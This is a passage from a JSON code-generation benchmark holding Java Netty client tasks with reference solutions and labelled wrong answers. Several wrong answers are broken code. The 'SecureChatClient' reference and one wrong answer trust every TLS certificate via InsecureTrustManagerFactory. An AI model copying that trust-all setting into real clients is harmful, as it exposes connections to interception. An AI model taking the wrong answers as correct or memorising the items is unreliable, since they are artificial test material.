    "wrong_result": "public class EchoClient {\n    private final boolean ssl;\n    private final String host;\n    private final int port;\n    private final int size;\n\n    public EchoClient(boolean ssl, String host, int port, int size) {\n        this.ssl = ssl;\n        this.host = host;\n        this.port = port;\n        this.size = size;\n    }\n\n    public void start() {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            initChannel(ch);\n                        }\n                    })\n                    .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 5000)\n                    .option(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n            future.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    private void initChannel(SocketChannel ch) {\n        if (ssl) {\n            SslContext sslCtx = SslContextBuilder.forClient()\n                    .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                    .build();\n            ch.pipeline().addLast(sslCtx.newHandler(ch.alloc()));\n            ch.pipeline().addLast(new StringDecoder(), new StringEncoder());\n        } else {\n            ch.pipeline().addLast(new StringDecoder(), new StringEncoder());\n        }\n        ch.pipeline().addLast(new EchoClientHandler());\n    }\n\n    private class EchoClientHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            ctx.writeAndFlush(\"Hello, Server!\");\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            System.out.println(\"Received: \" + msg);\n            ctx.writeAndFlush(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    public static void main(String[] args) {\n        new EchoClient(true, \"localhost\", 8080, 1024).start();\n    }\n}"
  },
  {
    "Task_id": 115,
    "Instruction": "Task Description: Create a Java class that implements a simple TCP chat client using Netty framework, capable of connecting to a remote server, sending messages from console input, and gracefully shutting down.\n\nClass Description: SimpleChatClient is a Netty-based TCP client that establishes a connection to a specified host and port, sends user input messages to the server, and handles connection lifecycle management.\n\nAttributes:\nhost: String - The hostname or IP address of the remote server to connect to\nport: int - The port number of the remote server to connect to\n\nMethods:\nSimpleChatClient: (String host, int port) -> void - Constructor that initializes the client with target host and port\nrun: () -> void - Main method that initializes Netty components, establishes connection, handles user input, and manages shutdown\n    - Initializes NioEventLoopGroup for I/O operations\n    - Configures Bootstrap with NioSocketChannel and handler\n    - Connects to remote server and maintains channel\n    - Reads user input from console and sends to server\n    - Handles graceful shutdown of resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class SimpleChatClient {\n\n    private final String host;\n    private final int port;\n\n    public SimpleChatClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap()\n                    .group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new SimpleChatClientInitializer());\n            Channel channel = bootstrap.connect(host, port).sync().channel();\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            while (true) {\n                channel.writeAndFlush(in.readLine() + \"\\r\\n\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class SimpleChatClient {\n    private final String host;\n    private final int port;\n    private final EventLoopGroup group;\n\n    public SimpleChatClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n        this.group = new NioEventLoopGroup();\n    }\n\n    public void run() {\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInboundHandlerAdapter() {\n                        private volatile Channel channel;\n\n                        @Override\n                        public void channelActive(ChannelHandlerContext ctx) {\n                            channel = ctx.channel();\n                            startInputThread();\n                        }\n\n                        private void startInputThread() {\n                            new Thread(() -> {\n                                Scanner scanner = new Scanner(System.in);\n                                while (true) {\n                                    String line = scanner.nextLine();\n                                    if (line.equalsIgnoreCase(\"exit\")) {\n                                        break;\n                                    }\n                                    channel.eventLoop().execute(() -> {\n                                        channel.writeAndFlush(line + \"\\n\");\n                                    });\n                                }\n                                channel.close();\n                            }).start();\n                        }\n\n                        @Override\n                        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n                            if (msg instanceof String) {\n                                System.out.println(msg);\n                            }\n                            ReferenceCountUtil.release(msg);\n                        }\n\n                        @Override\n                        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n                            cause.printStackTrace();\n                            ctx.close();\n                        }\n                    });\n\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n            future.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) {\n        if (args.length < 2) {\n            System.err.println(\"Usage: java SimpleChatClient <host> <port>\");\n            return;\n        }\n        new SimpleChatClient(args[0], Integer.parseInt(args[1])).run();\n    }\n}"
  },
  {
    "Task_id": 117,
    "Instruction": "Task Description: Create a secure TCP chat client using Java Netty framework that establishes an encrypted connection to a server, sends messages from standard input, and gracefully shuts down when instructed.\n\nClass Description: SecureChatClient is a Netty-based client that handles secure TCP communication with a chat server. It manages connection lifecycle, message sending, and proper resource cleanup.\n\nAttributes:\n- HOST: [String] - The server host address (default: \"127.0.0.1\")\n- PORT: [int] - The server port number (default: 8992)\n- group: [EventLoopGroup] - Manages client-side I/O threads\n- channel: [Channel] - Represents the active network connection\n- sslCtx: [SslContext] - SSL context for secure communication\n\nMethods:\n- SecureChatClient() -> [void] - Constructor that initializes SSL context and event loop group\n- connect() -> [void] - Establishes connection to the server using Bootstrap configuration\n- startChat() -> [void] - Starts interactive chat session reading from standard input and sending messages to server\n- shutdown() -> [void] - Gracefully shuts down the client and releases resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic final class SecureChatClient {\n\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8992\"));\n\n    private EventLoopGroup group;\n    private Channel channel;\n    private SslContext sslCtx;\n\n    public SecureChatClient() throws Exception {\n        this.sslCtx = SslContext.newClientContext(InsecureTrustManagerFactory.INSTANCE);\n        this.group = new NioEventLoopGroup();\n    }\n\n    public void connect() throws Exception {\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n         .channel(NioSocketChannel.class)\n         .handler(new SecureChatClientInitializer(sslCtx));\n\n        this.channel = b.connect(HOST, PORT).sync().channel();\n    }\n\n    public void startChat() throws Exception {\n        ChannelFuture lastWriteFuture = null;\n        BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n        for (;;) {\n            String line = in.readLine();\n            if (line == null) {\n                break;\n            }\n\n            lastWriteFuture = channel.writeAndFlush(line + \"\\r\\n\");\n\n            if (\"bye\".equals(line.toLowerCase())) {\n                channel.closeFuture().sync();\n                break;\n            }\n        }\n\n        if (lastWriteFuture != null) {\n            lastWriteFuture.sync();\n        }\n    }\n\n    public void shutdown() {\n        group.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class SecureChatClient {\n    private static final String HOST = \"127.0.0.1\";\n    private static final int PORT = 8992;\n    private final EventLoopGroup group;\n    private Channel channel;\n    private final SslContext sslCtx;\n\n    public SecureChatClient() {\n        group = new NioEventLoopGroup();\n        sslCtx = SslContextBuilder.forClient()\n                .protocols(\"TLSv1.2\", \"TLSv1.3\")\n                .build();\n    }\n\n    public void connect() {\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(sslCtx.newHandler(ch.alloc(), HOST, PORT));\n                        pipeline.addLast(new ChatHandler());\n                    }\n                });\n        ChannelFuture future = bootstrap.connect(HOST, PORT).syncUninterruptibly();\n        channel = future.channel();\n    }\n\n    public void startChat() {\n        Scanner scanner = new Scanner(System.in);\n        try {\n            while (true) {\n                String line = scanner.nextLine();\n                if (line.equalsIgnoreCase(\"exit\")) {\n                    break;\n                }\n                channel.writeAndFlush(line + \"\\n\");\n            }\n        } finally {\n            scanner.close();\n        }\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.close().awaitUninterruptibly();\n        }\n        group.shutdownGracefully().awaitUninterruptibly();\n        sslCtx.close().awaitUninterruptibly();\n    }\n\n    private class ChatHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            String message = (String) msg;\n            System.out.println(\"Server: \" + message);\n            ReferenceCountUtil.release(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    public static void main(String[] args) {\n        SecureChatClient client = new SecureChatClient();\n        client.connect();\n        client.startChat();\n        client.shutdown();\n    }\n}"
  },
  {
    "Task_id": 118,
    "Instruction": "Task Description: Create a WebSocket client using Java Netty framework that can establish a connection to a WebSocket server, send and receive frames, and handle connection lifecycle events.\n\nClass Description: WebSocketTestClient is a Netty-based WebSocket client implementation that handles WebSocket connections, frame transmission, and connection management. It supports different WebSocket versions and provides callback mechanisms for frame handling.\n\nAttributes:\n- bootstrap: [Bootstrap] - Netty bootstrap instance for client configuration\n- ch: [Channel] - Active channel representing the WebSocket connection\n- uri: [URI] - Target WebSocket server URI\n- version: [WebSocketVersion] - WebSocket protocol version to use\n- closed: [boolean] - Connection status flag\n- count: [AtomicInteger] - Counter for handler naming\n\nMethods:\n- connect(): [WebSocketTestClient] - Establishes connection to WebSocket server, performs handshake, and returns self for chaining\n- send(WebSocketFrame frame, FrameListener listener): [WebSocketTestClient] - Sends WebSocket frame and registers listener for response, returns self for chaining\n- destroy(): [void] - Gracefully closes connection and releases resources\n- destroy(boolean dirty): [void] - Closes connection with option for immediate termination\n- isActive(): [boolean] - Returns connection active status\n- isOpen(): [boolean] - Returns connection open status\n- isWritable(): [boolean] - Returns channel writable status\n\nNested Interfaces:\n- FrameListener: Callback interface for frame reception and error handling\n  - onFrame(WebSocketFrame frame): [void] - Called when frame is received\n  - onError(Throwable t): [void] - Called when error occurs\n\nNested Classes:\n- WSClientHandler: [SimpleChannelInboundHandler<Object>] - Internal handler for WebSocket handshake and frame processing\n  - handshakeFuture(): [ChannelFuture] - Returns handshake completion future\n  - handlerAdded(ChannelHandlerContext ctx): [void] - Initializes handshake promise\n  - channelActive(ChannelHandlerContext ctx): [void] - Initiates handshake\n  - channelRead0(ChannelHandlerContext ctx, Object o): [void] - Processes incoming messages\n  - exceptionCaught(ChannelHandlerContext ctx, Throwable cause): [void] - Handles channel errors",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.ChannelPromise;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.websocketx.CloseWebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshaker;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshakerFactory;\nimport io.netty.handler.codec.http.websocketx.WebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketVersion;\nimport io.netty.util.CharsetUtil;\nimport io.netty.util.ReferenceCountUtil;\n\nimport java.net.InetSocketAddress;\nimport java.net.URI;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic final class WebSocketTestClient {\n    private final Bootstrap bootstrap = new Bootstrap();\n    private Channel ch;\n    private final URI uri;\n    private final WebSocketVersion version;\n    private volatile boolean closed;\n    private static final AtomicInteger count = new AtomicInteger();\n\n    public WebSocketTestClient(WebSocketVersion version, URI uri) {\n        this.uri = uri;\n        this.version = version;\n    }\n\n    public WebSocketTestClient connect() throws Exception {\n        String protocol = uri.getScheme();\n        if (!\"ws\".equals(protocol)) {\n            throw new IllegalArgumentException(\"Unsupported protocol: \" + protocol);\n        }\n        final WebSocketClientHandshaker handshaker =\n                WebSocketClientHandshakerFactory.newHandshaker(\n                        uri, version, null, false, new DefaultHttpHeaders());\n        WSClientHandler handler = new WSClientHandler(handshaker);\n        EventLoopGroup group = new NioEventLoopGroup();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer() {\n                    @Override\n                    protected void initChannel(Channel channel) throws Exception {\n                        ChannelPipeline p = channel.pipeline();\n                        p.addLast(\n                                new HttpClientCodec(),\n                                new HttpObjectAggregator(8192), handler);\n                    }\n                });\n\n        ChannelFuture future =\n                bootstrap.connect(\n                        new InetSocketAddress(uri.getHost(), uri.getPort()));\n        future.syncUninterruptibly();\n        handler.handshakeFuture.syncUninterruptibly();\n        ch = future.channel();\n        return this;\n    }\n\n    public WebSocketTestClient send(WebSocketFrame frame, final FrameListener listener) {\n        ch.pipeline().addLast(\"responseHandler\" + count.incrementAndGet(), new SimpleChannelInboundHandler<Object>() {\n            @Override\n            protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n                if (msg instanceof CloseWebSocketFrame) {\n                    closed = true;\n                }\n                listener.onFrame((WebSocketFrame) msg);\n                ctx.pipeline().remove(this);\n            }\n\n            @Override\n            public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n                cause.printStackTrace();\n                listener.onError(cause);\n                ctx.pipeline().remove(this);\n            }\n        });\n        ChannelFuture cf = ch.writeAndFlush(frame).syncUninterruptibly();\n        if (!cf.isSuccess()) {\n            listener.onError(cf.cause());\n        }\n        return this;\n    }\n\n    public void destroy() {\n        this.destroy(false);\n    }\n\n    public void destroy(boolean dirty) {\n        if (!closed && !dirty) {\n            final CountDownLatch latch = new CountDownLatch(1);\n            send(new CloseWebSocketFrame(), new FrameListener() {\n                @Override\n                public void onFrame(WebSocketFrame frame) {\n                    latch.countDown();\n                }\n\n                @Override\n                public void onError(Throwable t) {\n                    latch.countDown();\n                }\n            });\n            try {\n                latch.await(10, TimeUnit.SECONDS);\n            } catch (InterruptedException e) {\n                throw new RuntimeException(e);\n            }\n        }\n        if (ch != null) {\n            ch.close().syncUninterruptibly();\n        }\n        try {\n            bootstrap.group().shutdownGracefully(0, 1, TimeUnit.SECONDS).get();\n        } catch (InterruptedException | ExecutionException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public boolean isActive() {\n        return this.ch != null && this.ch.isActive();\n    }\n\n    public boolean isOpen() {\n        return this.ch != null && this.ch.isOpen();\n    }\n\n    public boolean isWritable() {\n        return this.ch != null && this.ch.isWritable();\n    }\n\n    public interface FrameListener {\n        void onFrame(WebSocketFrame frame);\n        void onError(Throwable t);\n    }\n\n    private static final class WSClientHandler extends SimpleChannelInboundHandler<Object> {\n        private final WebSocketClientHandshaker handshaker;\n        private ChannelPromise handshakeFuture;\n\n        WSClientHandler(WebSocketClientHandshaker handshaker) {\n            super(false);\n            this.handshaker = handshaker;\n        }\n\n        public ChannelFuture handshakeFuture() {\n            return handshakeFuture;\n        }\n\n        @Override\n        public void handlerAdded(ChannelHandlerContext ctx) {\n            handshakeFuture = ctx.newPromise();\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            handshaker.handshake(ctx.channel());\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Object o) throws Exception {\n            Channel ch = ctx.channel();\n            if (!handshaker.isHandshakeComplete()) {\n                handshaker.finishHandshake(ch, (FullHttpResponse) o);\n                handshakeFuture.setSuccess();\n                ReferenceCountUtil.release(o);\n                return;\n            }\n\n            if (o instanceof FullHttpResponse) {\n                FullHttpResponse response = (FullHttpResponse) o;\n                ReferenceCountUtil.release(o);\n                throw new Exception(\"Unexpected HttpResponse (status=\" + response.getStatus() + \", content=\"\n                        + response.content().toString(CharsetUtil.UTF_8) + ')');\n            }\n            ctx.fireChannelRead(o);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            if (!handshakeFuture.isDone()) {\n                handshakeFuture.setFailure(cause);\n            }\n            ctx.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class WebSocketTestClient {\n    private final Bootstrap bootstrap;\n    private Channel ch;\n    private final URI uri;\n    private final WebSocketVersion version;\n    private boolean closed;\n    private final AtomicInteger count;\n\n    public WebSocketTestClient(URI uri, WebSocketVersion version) {\n        this.uri = uri;\n        this.version = version;\n        this.bootstrap = new Bootstrap();\n        this.count = new AtomicInteger(0);\n    }\n\n    public WebSocketTestClient connect() {\n        bootstrap.group(new NioEventLoopGroup())\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new WSClientHandler());\n                    }\n                });\n        ChannelFuture future = bootstrap.connect(uri.getHost(), uri.getPort()).syncUninterruptibly();\n        ch = future.channel();\n        return this;\n    }\n\n    public WebSocketTestClient send(WebSocketFrame frame, FrameListener listener) {\n        ch.writeAndFlush(frame).addListener(f -> {\n            if (!f.isSuccess()) {\n                listener.onError(f.cause());\n            }\n        });\n        return this;\n    }\n\n    public void destroy() {\n        if (!closed) {\n            ch.close().syncUninterruptibly();\n            closed = true;\n        }\n    }\n\n    public void destroy(boolean dirty) {\n        if (!closed) {\n            if (dirty) {\n                ch.close().syncUninterruptibly();\n            } else {\n                ch.close().syncUninterruptibly();\n            }\n            closed = true;\n        }\n    }\n\n    public boolean isActive() {\n        return ch != null && ch.isActive();\n    }\n\n    public boolean isOpen() {\n        return ch != null && ch.isOpen();\n    }\n\n    public boolean isWritable() {\n        return ch != null && ch.isWritable();\n    }\n\n    private class WSClientHandler extends SimpleChannelInboundHandler<Object> {\n        private final ChannelFuture handshakeFuture;\n\n        public WSClientHandler() {\n            handshakeFuture = new DefaultChannelPromise(ch);\n        }\n\n        @Override\n        public void handlerAdded(ChannelHandlerContext ctx) {\n            handshakeFuture = new DefaultChannelPromise(ch);\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            String request = \"GET / HTTP/1.1\\r\\n\" +\n                    \"Host: \" + uri.getHost() + \"\\r\\n\" +\n                    \"Upgrade: websocket\\r\\n\" +\n                    \"Connection: Upgrade\\r\\n\" +\n                    \"Sec-WebSocket-Key: dGhlhG52Q1NlcmRlZC1jZG4=\\r\\n\" +\n                    \"Sec-WebSocket-Version: 13\\r\\n\\r\\n\";\n            ctx.writeAndFlush(request);\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof FullHttpResponse) {\n                FullHttpResponse response = (FullHttpResponse) msg;\n                if (response.status().code() == 101) {\n                    handshakeFuture.setSuccess();\n                } else {\n                    handshakeFuture.setFailure(new IOException(\"Handshake failed: \" + response.status()));\n                }\n            } else if (msg instanceof WebSocketFrame) {\n                WebSocketFrame frame = (WebSocketFrame) msg;\n                if (frame instanceof TextWebSocketFrame) {\n                    String text = ((TextWebSocketFrame) frame).text();\n                    if (text.contains(\"echo\")) {\n                        send(new TextWebSocketFrame(\"Echo received\"), new FrameListener() {\n                            @Override\n                            public void onFrame(WebSocketFrame frame) {\n                                System.out.println(\"Echo response: \" + frame.text());\n                            }\n\n                            @Override\n                            public void onError(Throwable t) {\n                                System.err.println(\"Error during echo: \" + t.getMessage());\n                            }\n                        });\n                    }\n                }\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            if (handshakeFuture.isDone()) {\n                if (!handshakeFuture.isSuccess()) {\n                    handshakeFuture.cause().printStackTrace();\n                }\n            } else {\n                cause.printStackTrace();\n            }\n            destroy(true);\n        }\n\n        public ChannelFuture handshakeFuture() {\n            return handshakeFuture;\n        }\n    }\n\n    public interface FrameListener {\n        void onFrame(WebSocketFrame frame);\n        void onError(Throwable t);\n    }\n}"
  },
  {
    "Task_id": 119,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client using Netty framework for making GET and POST requests to a remote server, with support for timeout handling and asynchronous response processing.\n\nClass Description: TestHttpClient is a Netty-based HTTP client that handles both GET and POST requests asynchronously. It manages connection pooling, request/response processing, and timeout handling. The class uses Netty's event-driven architecture for efficient network communication.\n\nAttributes:\n- host: String - The target server hostname or IP address\n- port: int - The target server port number\n- defaultTimeout: int - Default timeout in milliseconds for request completion\n- workerGroup: NioEventLoopGroup - Netty event loop group for handling I/O operations\n- b: Bootstrap - Netty bootstrap for client configuration\n- results: ConcurrentHashMap<String, CompletableFuture<String>> - Map for tracking pending requests and their futures\n\nMethods:\n- init(): void - Initializes the Netty client configuration including pipeline setup\n- close(): void - Shuts down the client gracefully and releases resources\n- get(String uri) -> String - Sends an HTTP GET request to the specified URI\n- post(String uri, Map<String, String> params, Map<String, String> headers) -> String - Sends an HTTP POST request with parameters and headers\n- send(HttpRequest request) -> String - Internal method for sending requests and handling responses",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.multipart.DefaultHttpDataFactory;\nimport io.netty.handler.codec.http.multipart.HttpPostRequestEncoder;\nimport io.netty.util.CharsetUtil;\n\nimport java.net.URI;\nimport java.util.Map;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.TimeUnit;\n\npublic class TestHttpClient {\n    private String host;\n    private int port;\n    private int defaultTimeout;\n    private EventLoopGroup workerGroup;\n    private Bootstrap b;\n    private Map<String, CompletableFuture<String>> results = new ConcurrentHashMap<>();\n\n    public TestHttpClient(String host, int port, int defaultTimeout) {\n        this.host = host;\n        this.port = port;\n        this.defaultTimeout = defaultTimeout;\n        init();\n    }\n\n    private void init() {\n        b = new Bootstrap();\n        workerGroup = new NioEventLoopGroup();\n        b.group(workerGroup).channel(NioSocketChannel.class).handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            public void initChannel(SocketChannel ch) throws Exception {\n                ch.pipeline().addLast(\"http-decoder\", new HttpResponseDecoder());\n                ch.pipeline().addLast(\"http-encoder\", new HttpRequestEncoder());\n                ch.pipeline().addLast(\"http-aggregator\", new HttpObjectAggregator(1024 * 1024));\n                ch.pipeline().addLast(\"clientHandler\", new SimpleChannelInboundHandler<FullHttpResponse>() {\n                    protected void channelRead0(final ChannelHandlerContext ctx, final FullHttpResponse httpResponse) {\n                        CompletableFuture<String> future = results.get(ctx.channel().id().asLongText());\n                        if (future != null) {\n                            future.complete(httpResponse.content().toString(CharsetUtil.UTF_8));\n                        }\n                    }\n                });\n            }\n        });\n    }\n\n    public void close() {\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n            workerGroup = null;\n        }\n        results.clear();\n    }\n\n    public String get(String uri) throws Exception {\n        DefaultHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, new URI(uri).toASCIIString());\n        return send(request);\n    }\n\n    public String post(String uri, Map<String, String> params, Map<String, String> headers) throws Exception {\n        HttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.POST, new URI(uri).toASCIIString());\n        if (params != null && !params.isEmpty()) {\n            HttpPostRequestEncoder encoder = new HttpPostRequestEncoder(new DefaultHttpDataFactory(), request, false);\n            for (Map.Entry<String, String> entry : params.entrySet()) {\n                encoder.addBodyAttribute(entry.getKey(), entry.getValue());\n            }\n            request = encoder.finalizeRequest();\n        }\n        if (headers != null) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                request.headers().set(entry.getKey(), entry.getValue());\n            }\n        }\n        return send(request);\n    }\n\n    private String send(HttpRequest request) throws Exception {\n        ChannelFuture f = b.connect(host, port).sync();\n        CompletableFuture<String> future = new CompletableFuture<>();\n        results.put(f.channel().id().asLongText(), future);\n        String result;\n        try {\n            f.channel().writeAndFlush(request).sync();\n            result = future.get(defaultTimeout, TimeUnit.MILLISECONDS);\n        } finally {\n            results.remove(f.channel().id().asLongText());\n            f.channel().closeFuture().sync();\n        }\n        return result;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class TestHttpClient {\n    private final String host;\n    private final int port;\n    private final int defaultTimeout;\n    private final NioEventLoopGroup workerGroup;\n    private final Bootstrap b;\n    private final ConcurrentHashMap<String, CompletableFuture<String>> results = new ConcurrentHashMap<>();\n\n    public TestHttpClient(String host, int port, int defaultTimeout) {\n        this.host = host;\n        this.port = port;\n        this.defaultTimeout = defaultTimeout;\n        this.workerGroup = new NioEventLoopGroup();\n        this.b = new Bootstrap();\n        init();\n    }\n\n    private void init() {\n        b.group(workerGroup)\n         .channel(NioSocketChannel.class)\n         .option(ChannelOption.SO_KEEPALIVE, true)\n         .handler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             protected void initChannel(SocketChannel ch) {\n                 ch.pipeline().addLast(\n                     new ReadTimeoutHandler(defaultTimeout),\n                     new HttpClientCodec(),\n                     new HttpObjectAggregator(1048576),\n                     new SimpleChannelInboundHandler<HttpObject>() {\n                         @Override\n                         protected void channelRead0(ChannelHandlerContext ctx, HttpObject msg) throws Exception {\n                             if (msg instanceof HttpResponse) {\n                                 HttpResponse response = (HttpResponse) msg;\n                                 if (response.status().code() == 200) {\n                                     HttpContent content = null;\n                                     StringBuilder responseText = new StringBuilder();\n                                     while ((content = (HttpContent) ctx.readInbound()) != null) {\n                                         responseText.append(content.content().toString(CharsetUtil.UTF_8));\n                                     }\n                                     ctx.close();\n                                     String requestId = (String) ctx.channel().attr(AttributeKey.valueOf(\"requestId\")).get();\n                                     results.get(requestId).complete(responseText.toString());\n                                 } else {\n                                     ctx.close();\n                                     String requestId = (String) ctx.channel().attr(AttributeKey.valueOf(\"requestId\")).get();\n                                     results.get(requestId).completeExceptionally(new RuntimeException(\"HTTP error: \" + response.status().code()));\n                                 }\n                             }\n                         }\n                     });\n             }\n         });\n    }\n\n    public void close() {\n        results.clear();\n        workerGroup.shutdownGracefully();\n    }\n\n    public String get(String uri) {\n        String requestId = UUID.randomUUID().toString();\n        CompletableFuture<String> future = new CompletableFuture<>();\n        results.put(requestId, future);\n        \n        try {\n            ChannelFuture futureChannel = b.connect(host, port).sync();\n            Channel channel = futureChannel.channel();\n            channel.attr(AttributeKey.valueOf(\"requestId\")).set(requestId);\n            \n            HttpRequest request = new DefaultHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, uri);\n            request.headers().set(HttpHeaderNames.HOST, host);\n            request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.CLOSE);\n            \n            ChannelFuture cf = channel.writeAndFlush(request);\n            cf.addListener(f -> {\n                if (!f.isSuccess()) {\n                    future.completeExceptionally(f.cause());\n                }\n            });\n            \n            future.get(defaultTimeout, TimeUnit.MILLISECONDS);\n            futureChannel.channel().close().sync();\n            return future.join();\n        } catch (Exception e) {\n            future.completeExceptionally(e);\n            return \"\";\n        }\n    }\n\n    public String post(String uri, Map<String, String> params, Map<String, String> headers) {\n        String requestId = UUID.randomUUID().toString();\n        CompletableFuture<String> future = new CompletableFuture<>();\n        results.put(requestId, future);\n        \n        try {\n            ChannelFuture futureChannel = b.connect(host, port).sync();\n            Channel channel = futureChannel.channel();\n            channel.attr(AttributeKey.valueOf(\"requestId\")).set(requestId);\n            \n            FormUrlEncodedEncoder encoder = new FormUrlEncodedEncoder();\n            encoder.addParams(params);\n            String body = encoder.getBody();\n            \n            HttpRequest request = new DefaultHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.POST, uri);\n            request.headers().set(HttpHeaderNames.CONTENT_TYPE, \"application/x-www-form-urlencoded\");\n            request.headers().set(HttpHeaderNames.HOST, host);\n            request.headers().set(HttpHeaderNames.CONNECTION, 